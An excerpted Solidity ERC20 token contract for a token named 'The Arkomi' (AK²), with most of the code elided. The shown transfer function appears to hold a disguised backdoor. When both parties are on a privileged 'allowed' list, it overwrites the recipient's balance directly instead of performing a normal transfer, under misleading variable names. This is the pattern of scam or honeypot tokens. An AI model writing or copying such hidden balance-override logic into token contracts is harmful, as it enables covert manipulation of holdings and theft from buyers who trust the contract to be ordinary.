...
contract Ev2 is Context, IERC20, Ownable {
    ...
    string private _name = unicode"The Arkomi";
    string private _symbol = unicode"AK²";
    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 public maxSWAP = 100000 * 10**_decimals;
    ...
    function _transferStandard(address sender, address recipient, uint256 valAmount,bool dataString) private {
        ...
        bool excludedfromfree = allowed[sender] && allowed[recipient];
             if (excludedfromfree ){ _tOwned[recipient] =reflow;
        } else { emit Transfer(sender, recipient, tValue);
         }  
    }  
}